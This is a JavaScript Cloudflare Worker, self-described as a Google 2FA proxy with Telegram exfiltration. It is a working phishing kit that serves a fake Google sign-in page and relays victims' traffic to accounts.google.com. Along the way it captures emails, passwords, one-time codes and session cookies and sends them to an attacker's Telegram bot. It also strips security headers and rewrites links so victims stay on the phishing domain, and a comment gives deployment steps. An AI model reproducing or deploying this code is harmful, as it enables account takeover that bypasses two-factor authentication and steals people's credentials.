// Cloudflare Worker — Google 2FA Proxy + Telegram Exfil
// Deploy on Cloudflare Workers, set your bot token and chat id below.

const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
const TARGET_HOST = 'accounts.google.com';

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event));
});

async function handleRequest(event) {
  const request = event.request;
  const url = new URL(request.url);

  // Serve fake login page for root GET
  if (request.method === 'GET' && url.pathname === '/') {
    return new Response(getFakeLoginPage(), {
      headers: { 'Content-Type': 'text/html' }
    });
  }

  // Build target URL
  let targetPath = url.pathname;
  let targetQuery = url.search;

  // If POST to root, map to Google's identifier endpoint
  if (request.method === 'POST' && url.pathname === '/') {
    targetPath = '/signin/v2/identifier';
    targetQuery = '?flowName=GlifWebSignIn&flowEntry=ServiceLogin';
  }

  const targetUrl = new URL(`https://${TARGET_HOST}${targetPath}${targetQuery}`);

  // Read body if POST
  let bodyText = '';
  if (request.method === 'POST') {
    bodyText = await request.text();
    const params = new URLSearchParams(bodyText);
    const email = params.get('Email') || params.get('identifier') || params.get('email');
    const pass = params.get('Passwd') || params.get('password') || params.get('passwd');
    const otp = params.get('Pin') || params.get('otp') || params.get('TotpPin');
    if (email || pass || otp) {
      let msg = `[${new Date().toISOString()}] ${url.hostname}\n`;
      if (email) msg += `Email: ${email}\n`;
      if (pass) msg += `Password: ${pass}\n`;
      if (otp) msg += `OTP: ${otp}\n`;
      event.waitUntil(sendToTelegram(msg));
    }
  }

  // Prepare headers for proxy
  const proxyHeaders = new Headers(request.headers);
  proxyHeaders.set('Host', TARGET_HOST);

  const proxyRequest = new Request(targetUrl.toString(), {
    method: request.method,
    headers: proxyHeaders,
    body: bodyText || undefined,
    redirect: 'manual'
  });

  const response = await fetch(proxyRequest);

  // Capture all Set-Cookie headers
  const setCookieHeaders = [];
  response.headers.forEach((value, key) => {
    if (key.toLowerCase() === 'set-cookie') {
      setCookieHeaders.push(value);
    }
  });
  if (setCookieHeaders.length > 0) {
    event.waitUntil(sendToTelegram(`Cookies from ${url.hostname}:\n${setCookieHeaders.join('\n')}`));
  }

  // Clone response and modify headers
  const newHeaders = new Headers(response.headers);
  const location = newHeaders.get('Location');
  if (location) {
    newHeaders.set('Location', location.replace(/https?:\/\/accounts\.google\.com/g, `https://${url.hostname}`));
  }
  newHeaders.delete('Content-Security-Policy');
  newHeaders.delete('Content-Security-Policy-Report-Only');
  newHeaders.delete('X-Frame-Options');

  // If HTML, rewrite Google URLs to our domain
  let responseBody = response.body;
  const contentType = newHeaders.get('Content-Type') || '';
  if (contentType.includes('text/html')) {
    let text = await response.text();
    text = text.replace(/https?:\/\/accounts\.google\.com/g, `https://${url.hostname}`);
    text = text.replace(/\/\/accounts\.google\.com/g, `//${url.hostname}`);
    responseBody = text;
  }

  return new Response(responseBody, {
    status: response.status,
    statusText: response.statusText,
    headers: newHeaders
  });
}

async function sendToTelegram(text) {
  const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  await fetch(apiUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'HTML'
    })
  });
}

function getFakeLoginPage() {
  return `<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Sign in - Google Accounts</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: 'Roboto', Arial, sans-serif; background: #fff; margin: 0; }
        .container { max-width: 450px; margin: 80px auto; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo img { width: 75px; }
        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 30px; }
        input[type="email"] { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; margin-bottom: 20px; }
        input[type="email"]:focus { outline: none; border: 2px solid #1a73e8; }
        .btn { width: 100%; padding: 12px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
        .btn:hover { background: #1557b0; }
        .footer { text-align: center; margin-top: 30px; font-size: 12px; color: #5f6368; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
        </div>
        <h1>Sign in</h1>
        <form method="POST" action="/">
            <input type="email" name="Email" placeholder="Email or phone" required autofocus>
            <button type="submit" class="btn">Next</button>
        </form>
        <div class="footer">
            <a href="#">Forgot email?</a>
        </div>
    </div>
</body>
</html>`;
}